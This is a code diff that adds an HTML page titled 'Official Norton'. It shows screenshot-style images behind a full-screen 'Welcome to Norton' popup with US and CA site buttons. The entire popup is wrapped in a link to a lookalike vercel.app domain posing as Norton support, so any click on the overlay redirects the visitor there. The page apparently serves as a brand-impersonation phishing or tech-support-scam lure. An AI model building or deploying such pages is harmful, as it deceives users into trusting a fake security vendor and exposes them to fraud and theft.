@@ -1,0 +1,55 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="./assets/favicom.png" type="image/x-icon">
+    <title>Official Norton</title>
+    <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
+</head>
+<style>
+    .popup {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 999;
+    }
+</style>
+
+<body>
+    <section>
+        <div class="container mx-auto">
+            <img class="w-full h-full object-cover hidden md:block" src="./assets/laptop-v.png" alt="laptop">
+            <img class="w-full h-full object-cover md:hidden sm:block" src="./assets/mobile-v.png" alt="mobile">
+        </div>
+    </section>
+    <a href="https://support-norton-com.vercel.app/">
+        <section class="popup p-2 flex flex-col items-center justify-center">
+            <div
+                class="container mx-auto p-4 bg-white w-full md:w-1/2 lg:w-1/3 h-1/2 border border-gray-300 shadow-lg rounded-md flex flex-col gap-2 items-center justify-center">
+                <h2 class="text-3xl lg:text-4xl font-bold">Welcome to Norton</h2>
+                <p class="mt-2 text-md text-gray-600">
+                    To check out product designed specifically for your country, please visit site
+                </p>
+                <div class="flex mt-4 items-center gap-4 lg:gap-8">
+                    <div>
+                        <button class="text-md lg:text-xl text-blue-600 hover:underline font-semibold">Visit the US
+                            site</button>
+                    </div>
+                    <div>
+                        <button class="text-md lg:text-xl text-black bg-yellow-300 p-3 rounded-md font-semibold">Go to
+                            CA
+                            site</button>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+    </a>
+</body>
+
+</html>
